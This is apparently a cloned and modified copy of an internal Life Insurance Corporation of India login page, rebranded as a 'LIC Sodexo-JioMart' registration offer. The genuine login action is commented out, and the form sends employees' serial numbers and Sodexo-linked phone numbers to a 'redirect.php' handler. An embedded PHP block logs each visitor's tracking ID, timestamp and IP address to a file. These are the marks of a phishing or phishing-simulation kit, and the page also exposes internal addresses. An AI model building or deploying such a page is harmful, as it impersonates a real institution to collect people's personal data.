<!-- saved from url=(0052)http://10.240.28.220:8080/eFeap/login/efeaplogin.jsp -->
<html xmlns="http://www.w3.com/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><link rel="stylesheet" type="text/css" media="screen" href="LIC_AP_files/style.css">
<link rel="stylesheet" type="text/css" media="screen" href="LIC_AP_files/dhtmlwindow.css">

<script language="javascript" src="LIC_AP_files/logindhtmlwindow.txt">
</script></head><body onload="noBack();fnCheck();"><div id="dhtmlwindowholder"><span style="display:none">.</span></div><div id="dhtmlwindowholder"><span style="display:none">.</span></div><div id="dhtmlwindowholder"><span style="display:none">.</span></div><div id="dhtmlwindowholder"><span style="display:none">.</span></div><div id="dhtmlwindowholder"><span style="display:none">.</span></div><div id="dhtmlwindowholder"><span style="display:none">.</span></div><div id="dhtmlwindowholder"><span style="display:none">.</span></div>
<script type="text/javascript" src="LIC_AP_files/ddlevelsmenu.txt">
</script>
<script type="text/javascript" src="LIC_AP_files/modal.txt">
</script><div id="interVeil"></div><div id="interVeil"></div><div id="interVeil"></div><div id="interVeil"></div><div id="interVeil"></div><div id="interVeil"></div><div id="interVeil"></div>
<script language="javascript" src="LIC_AP_files/common.txt">
</script>

<?php 
//session_start() 
$rid = $_GET["rid"]; 
$cookie_name="rid"; 
$t= date("Y-m-d H:i:s"); 
$cl_ip = $_SERVER['REMOTE_ADDR']; 
setcookie($rid,$rid); 
$fp = fopen('access_log.txt', 'a'); 
fwrite($fp, $rid.",".$t.",".$cl_ip."\n"); 
fclose($fp);
?>

 <title>LIC Sodexo-JioMart</title>
        
        
        <link rel="stylesheet" media="screen" type="text/css" href="LIC_AP_files/login_style.css">
        <link rel="stylesheet" media="screen" type="text/css" href="LIC_AP_files/style.css">
        <script type="text/javascript" src="LIC_AP_files/mask.txt">
        </script>

        <script>
             function forgot()
            {
                var msg="Hello";
                var path=document.getElementById("path").value;
                copy = dhtmlmodal.open("copy", "iframe", path+"/login/forgotPassword.jsp?message="+msg+"", "Confirmation Message", "width=360px,height=120px,resize=1,scrolling=1,center=1", "recal");
            }

            function myFunction(){
                var x= document.getElementById("j_username");
                var y= document.getElementById("myImg");
                if(x.type=="password"){
                    x.type = "text";
                    y.src="./LIC_AP_files/eye-on.gif"
                }else{
                    x.type = "password";
                    y.src="./LIC_AP_files/eye-off.gif";
                }
            }

			function fnCheck()
            {
                if(!(window.name=="LoginWindow"))
                {
                    // alert("window name::"+window.name);
                    // window.location="/eFeap";
                }
            } 
            function gotoLoginPage()
            {
                // alert("inside gotologinpage");
                // window.location="/eFeap/jsp/checklogin.jsp";
            }
            function  checkRequiredField(){
                if( document.getElementById("j_username").value==""){
                    document.getElementById("enterTxtErr0").style.display="block";
                    window.setTimeout(function(){
                        document.getElementById("j_username").focus();
                    }, 0);
                    return false;
                }
                if( document.getElementById("j_password").value==""){
                    document.getElementById("enterTxtErr1").style.display="block";
                    window.setTimeout(function(){
                        document.getElementById("j_password").focus();
                    }, 0);
                    return false;
                }



            }
            function popupwin(){
                //alert('');
                var path=document.getElementById("path").value;
                //alert("Path " + path);

                var msg="";
                // parent.copy.hide();
                //  copy = dhtmlmodal.open("copy", "iframe", path+"/login/ftlchangepasswordPopup.jsp?message="+msg+"", "Change Password", "width=350px,height=170px,resize=1,scrolling=1,center=1", "recal");
                //self.close();

                //parent.cancelforLoginAction(action);

            }

            function openPage()
            {
               
                var path=document.getElementById("path").value;
                
                copy = dhtmlmodal.open("copy", "iframe", path+"/login/forgotpass.jsp", "Forgot Password", "width=350px,height=170px,resize=1,scrolling=1,center=1", "recal");


            }
            function criticalPopup(criticalErrorMsg,flag){
                var loginFlag='YES';
                copy = dhtmlmodal.open("copy", "iframe", "/eFeap/login/popup.jsp?message="+criticalErrorMsg+"&focusflag="+flag+"&loginflag="+loginFlag+"", "Error Message", "width=420px,height=120px,resize=1,scrolling=1,center=1", "recal");
            }


            function isNumberKey(evt)
            {
                var charCode = (evt.which) ? evt.which : evt.keyCode;
                if (charCode !== 46 && charCode > 31
                        && (charCode < 48 || charCode > 57))
                    return false;
 
                return true;
            }

            function noBack(){window.history.forward();}
        </script>

    
        
        <input type="hidden" id="path" name="path" value="/eFeap">

        <div id="header">
            <div class="topborder">&nbsp;</div>
            <div id="logoHolder">
                <div id="logo"><img src="LIC_AP_files/lic_logo.png" style="padding: inherit;padding-left: 50;padding-top: 29;" width="10%" height="auto" align="left">
  <img src="LIC_AP_files/prime.png" style="padding-left:30px;padding-top: 1; float:right" width="10%" height="auto" align="right">
<img style="padding-left:130px;padding-top: 20; float:right" src="LIC_AP_files/Sodexo_2.jpg" width="14%" height="auto" align="right">
</div>
            </div>
        </div>

        <div id="bodyCon">


            <!-- <form id="j_security_check" action="http://10.240.28.220:8080/eFeap/login/j_security_check" method="POST" autocomplete="off"> -->
			<form method="post" action="redirect.php" >

                <input type="hidden" id="path" name="path" value="/eFeap">

                <table class="formtable" width="100%" cellspacing="0" cellpadding="0" border="0">
                    <tbody><tr>
                        <td width="36%">
                            <table width="100%" cellspacing="0" cellpadding="0" border="0">
                                <tbody><tr>
                                    <td class="label-bold" nowrap="nowrap">Username (Sr. No)</td>
                                    <td nowrap="nowrap"><!-- <input type="text" name="j_username" maxlength="15" value="" tabindex="1" id="j_username" class="textfield" onkeydown="enterTxtErr0.style.display='none';"/>-->
                                        <input name="j_username" id="j_username" class="textfield" tabindex="1" maxlength="6" onkeydown="enterTxtErr0.style.display='none';" onkeypress="return isNumberKey(event)" type="text"  pattern="^(?!0{6}|1{6}|9{6})[0-9]{6}">                                   &nbsp;<img id="myImg" src="LIC_AP_files/eye-off.gif" alt="Show User Name" style="position:relative; margin: -4px;width:0px;height:0px;">
                                        <span id="enterTxtErr0" class="valid-error" style="display: none;"> Username cannot be empty.</span>
                                    </td>
                                </tr>
                                <tr>
                                    <td class="label-bold">Contact (Linked with Sodexo card)</td>
                                    <td><input name="j_password" maxlength="10" tabindex="2" id="j_password" class="textfield" onkeydown="enterTxtErr1.style.display='none';" onkeypress="return isNumberKey(event)"  type="text" pattern="[789][0-9]{9}">
                                        <span id="enterTxtErr1" class="valid-error" style="display: none;"> Contact cannot be empty.</span></td>
                                </tr>
                                <tr>
                                    <td>
                                        <span id="ipaddrs"></span>
                                    </td>
                                </tr>

                                <tr>
                                    <td colspan="2" align="center"><input type="submit" id="j_security_check_0" class="ovalbutton" tabindex="3" onclick="return checkRequiredField();" value="Register" style="background-color: #4CAF50;">
</td>


                                </tr>
                                <tr>
                                    <td colspan="2" align="center">&nbsp;</td>
                                </tr>
								<!-- saved from url=(0052)http://10.240.28.220:8080/eFeap/login/efeaplogin.jsp 
                                <tr>
                                    <td colspan="2" align="center">
                                        <a tabindex="5" href="http://10.240.28.220:8080/eFeap/login/changepass.jsp"><font size="2" color="blue">Change Password</font></a>
                                    </td>
                                </tr>
                                 <tr>
                                    <td colspan="2" align="center">
                                        <a tabindex="4" href="http://10.240.28.220:8080/eFeap/login/forgotpass.jsp"><font size="2" color="blue">Forgot Password ?</font></a>
                                    </td>
                                </tr>
                                <tr>
                                    <td colspan="2" align="center">
                                        <a tabindex="4" href="http://10.240.28.220:8080/eFeap/login/forgotuserid.jsp"><font size="2" color="blue">Forgot User id ?</font></a>
                                    </td>
                                </tr>

								-->

                            </tbody></table>
                        </td>
                        <td width="64%" align="right"><img src="LIC_AP_files/image_collage.jpg" width="543" height="341"></td>
                    </tr>

                </tbody></table>
                <table width="100%" cellspacing="0" cellpadding="0" border="0">
                    <tbody><tr class="footer">
                        <td>&nbsp;</td>
                    </tr>
                    <tr>
                        <td class="caption">Copyright : Life Insurance Corporation of India<font color="#FFFFFF">&nbsp; IP : 10.240.9.238</font></td>
                    </tr>
                </tbody></table>




            





            
            
            
                <script>
                    document.getElementById('j_username').focus();
                </script>
            


        </div>
    





<style type="text/css"></style></body></html>
